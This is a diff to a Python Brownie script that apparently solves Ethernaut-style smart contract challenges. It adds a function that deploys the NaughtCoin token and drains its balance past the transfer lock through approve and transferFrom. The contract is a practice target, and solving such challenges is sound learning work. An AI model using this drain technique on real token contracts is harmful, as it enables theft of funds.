@@ -7,6 +7,7 @@ import time
 from web3.auto.infura import w3
 import os
 from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
+from brownie import NaughtCoin
 
 
 
@@ -254,6 +255,29 @@ def deploy_gatekeepertwo():
     print(f"After attack...entrant: {gatekeepertwo.entrant()}")
 
 
+def naughtcoin():
+    account = get_account()
+    naughtcoin = deploy_contract(NaughtCoin, "NaughtCoin", 0, [account.address])
+
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        print(f"Victim balance: {naughtcoin.balanceOf(account.address)}")
+        print(f"Attacker balance: {naughtcoin.balanceOf(accounts[1].address)}")
+        naughtcoin.approve(accounts[1].address, naughtcoin.balanceOf(account.address)).wait(1)
+        print(f"Allowance: {naughtcoin.allowance(account.address, accounts[1].address)}")
+        naughtcoin.transferFrom(account.address, accounts[1].address, naughtcoin.balanceOf(account.address), {"from":accounts[1].address}).wait(1)
+        print(f"Victim balance: {naughtcoin.balanceOf(account.address)}")
+        print(f"Attacker balance: {naughtcoin.balanceOf(accounts[1].address)}")
+    else:
+        # we'll just drain the contract into a random wallet
+        randomAddress = '0x7ffC57839B00206D1ad20c69A1981b489f772031'
+        print(f"Balance: {naughtcoin.balanceOf(account.address)}")
+        naughtcoin.approve(account.address, naughtcoin.balanceOf(account.address), {"from":account.address}).wait(1)
+        print(f"Allowance: {naughtcoin.allowance(account.address, account.address)}")
+        naughtcoin.transferFrom(account.address, randomAddress, naughtcoin.balanceOf(account.address), {"from":account.address}).wait(1)
+        print(f"After attack...Balance: {naughtcoin.balanceOf(account.address)}")
+
+
+    
 
 
 
@@ -275,4 +299,5 @@ def main():
     #deploy_elevator()
     #deploy_privacy()
     #deploy_gatekeeperone()
-    deploy_gatekeepertwo()
+    #deploy_gatekeepertwo()
+    naughtcoin()
